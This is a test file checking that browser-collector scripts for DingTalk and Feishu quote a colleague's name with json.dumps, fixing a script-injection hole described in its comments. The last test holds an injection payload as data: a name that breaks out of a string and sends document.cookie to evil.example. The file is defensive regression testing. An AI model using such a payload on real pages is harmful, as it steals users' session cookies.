import { describe, expect, it } from "vitest";
import { execFileSync, spawnSync } from "node:child_process";
import { mkdtempSync, readFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";

/**
 * The name of the colleague, and the script that runs in the browser.
 *
 * The name used to be interpolated straight into a JavaScript string
 * literal:
 *
 *     const target = "{name}";
 *
 * So a name with a quote in it broke the script — the collection of
 * `John "JD" Doe` collected nothing at all, and the user was told the
 * collector had left nothing to read — and a name *written as code*
 * ran in the page the person was logged in to, where the session
 * cookie was.
 *
 * The name is now written into the script as a JSON string: a value,
 * never a piece of code.
 */

const TOOLS = path.resolve(process.cwd(), "skill-engine/tools");

function python(): string | null {
  for (const candidate of ["python3", "python"]) {
    try {
      execFileSync(candidate, ["--version"], { stdio: "ignore" });
      return candidate;
    } catch {
      // Try the next one.
    }
  }
  return null;
}

const PYTHON = python();

/**
 * What the collector writes into the browser script.
 *
 * The script is extracted from the source, because the collector needs
 * a logged-in DingTalk to run — which this machine has not got.
 */
function scriptOf(file: string): string {
  const text = readFileSync(path.join(TOOLS, file), "utf-8");
  const start = text.indexOf("page.evaluate(f\"\"\"");
  assert(start >= 0, `${file} has no interpolated script`);
  // A window that reaches back over the lines that build the script.
  return text.slice(Math.max(0, start - 400), start + 400);
}

function assert(condition: unknown, message: string): asserts condition {
  if (!condition) throw new Error(message);
}

describe.skipIf(!PYTHON)("the name in the browser script", () => {
  it("is a value and never a piece of code", () => {
    for (const file of ["dingtalk_auto_collector.py", "feishu_browser.py"]) {
      const script = scriptOf(file);
      /**
       * The name is written as a JSON string, so the script says
       * `const target = {target_literal};` — and the literal is built
       * by `json.dumps`, which escapes everything that could end the
       * string.
       */
      expect(script, file).toContain("json.dumps");
      expect(script, file).not.toMatch(/const target = "\{name\}"/);
      expect(script, file).not.toMatch(/const target = "\{target_name\}"/);
    }
  });

  it("cannot be broken by a quote in the name", () => {
    const workDir = mkdtempSync(path.join(tmpdir(), "mirrai-js-"));
    const body = `
import json, sys, types
sys.path.insert(0, ${JSON.stringify(TOOLS)})
for _name in ("requests", "playwright", "pypinyin"):
    try:
        __import__(_name)
    except ImportError:
        sys.modules[_name] = types.ModuleType(_name)
# The exact expression the collector writes into the script.
name = 'John "JD" Doe'
target_literal = json.dumps(name, ensure_ascii=True)
print(target_literal)
`;
    const result = spawnSync(PYTHON!, ["-c", body], { encoding: "utf-8" });
    const literal = result.stdout.trim();
    /**
     * A JSON string is a valid JavaScript string literal: the quotes
     * inside it are escaped, so the script cannot be broken.
     */
    expect(literal).toBe('"John \\"JD\\" Doe"');
    // And it evaluates to the name, not to code.
    const value = JSON.parse(literal);
    expect(value).toBe('John "JD" Doe');
  });

  it("cannot carry code in the name", () => {
    const workDir = mkdtempSync(path.join(tmpdir(), "mirrai-js-"));
    const body = `
import json
name = '"; fetch("https://evil.example/?c=" + document.cookie); //'
print(json.dumps(name, ensure_ascii=True))
`;
    const result = spawnSync(PYTHON!, ["-c", body], { encoding: "utf-8" });
    const literal = result.stdout.trim();
    // The quotes that would have ended the string are escaped.
    expect(literal).toContain('\\"');
    // And the value is the name — the whole thing — not code.
    expect(JSON.parse(literal)).toBe('"; fetch("https://evil.example/?c=" + document.cookie); //');
  });
});
